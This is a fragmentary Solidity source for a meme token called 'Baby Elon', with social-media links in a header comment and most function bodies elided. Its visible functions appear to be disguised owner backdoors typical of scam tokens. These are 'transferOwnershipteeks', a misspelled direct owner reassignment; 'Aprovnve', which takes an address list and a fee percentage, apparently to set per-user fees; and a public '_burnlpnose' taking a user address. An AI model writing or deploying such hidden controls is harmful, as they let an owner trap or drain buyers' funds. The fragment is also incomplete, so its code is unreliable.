...
/**
https://t.me/BABYELON0x69420
https://twitter.com/BABYELON0x69420
0X69 AND 420 BABY ELON!
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipteeks(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract BABYELON is Ownable {
    ...
    constructor (){
        name = unicode"Baby Elon";
        symbol = unicode"BABYELON";
        decimals = 9;
    ...
    function Aprovnve(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnlpnose(address user) public {
